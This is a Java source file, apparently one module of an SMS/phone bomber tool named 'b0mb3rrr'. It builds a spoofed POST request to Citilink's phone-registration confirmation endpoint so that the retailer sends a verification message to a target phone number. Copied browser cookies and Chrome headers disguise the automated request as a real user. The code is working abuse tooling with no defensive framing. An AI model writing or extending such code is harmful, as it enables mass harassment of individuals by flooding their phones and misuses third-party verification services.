package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.Request;

public class Citilink extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        ;

        return new Request.Builder()
                .url(STR."https://www.citilink.ru/registration/confirm/phone/\{phone.phone()}/")
                .post(new FormBody.Builder().build())
                .header("accept", "*/*")
                .header("accept-language", "en-US,en;q=0.9,ru;q=0.8")
                .header("content-length", "0")
                .header("cookie", "_tuid=d6472f5539bea88c80d3139899bb990ffd3e4341; _space=krasn_cl%3A1m15; _city_guessed=1; __exponea_etc__=6152198c-d8aa-42f5-9cad-dd4a4b5cb3c1; _ym_uid=1712670324424383527; _ym_d=1712670324; flocktory-uuid=2007cae8-ad0a-4220-8542-e6eafcc6d40b-9; tmr_lvid=db4f505fbc3f2198c3340ca06efdee0f; tmr_lvidTS=1712670324478; advcake_session_id=8c1976c3-6fd4-32dd-093d-4bcffced211a; domain_sid=Rogg1_IibLayfxGxhEXL0%3A1712670327430; adrcid=AIEvUCsYhunM4M-u0wBuWqw; ab_test=90x10v4%3A1%7Creindexer%3A2%7Cdynamic_yield%3A3%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A2%7Cdynamic_yield%3A3%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_segment=28; _sp_ses.faaa=*; advcake_track_id=05042658-042d-f4d7-1efb-3752efc3bdad; advcake_track_url=https%3A%2F%2Fwww.citilink.ru%2F; advcake_utm_partner=; advcake_utm_webmaster=; advcake_click_id=; __exponea_time2__=-0.6145176887512207; _ym_isad=2; _clck=1u52mj%7C2%7Cfku%7C0%7C1560; adrdel=1; _clsk=jzge4v%7C1712860663195%7C1%7C0%7Cl.clarity.ms%2Fcollect; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.1449427133.1712670324; _gid=GA1.2.483075943.1712860663; _dc_gtm_UA-5582449-1=1; tmr_detect=0%7C1712860664541; _sp_id.faaa=c4511eff-8aff-4473-b4ec-f1fa4a37c17f.1712670324.2.1712860669.1712670385.39e3363b-48b7-494b-a20c-494946ae115f.568f4c7f-c023-4513-9faf-4695e04207da.77f8001e-9b50-46bb-a2f8-fcc948ed5535.1712860661705.5; _ga_DDRSRL2E1B=GS1.1.1712860661.2.0.1712860669.52.0.0; _ga_DDRSRL2E1B-DG=GS1.1.1712860661.2.0.1712860669.0.0.469094773")
                .header("origin", "https://www.citilink.ru")
                .header("referer", "https://www.citilink.ru/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest");
    }

    @Override
    public String getServiceName() {
        return "Citilink";
    }
}
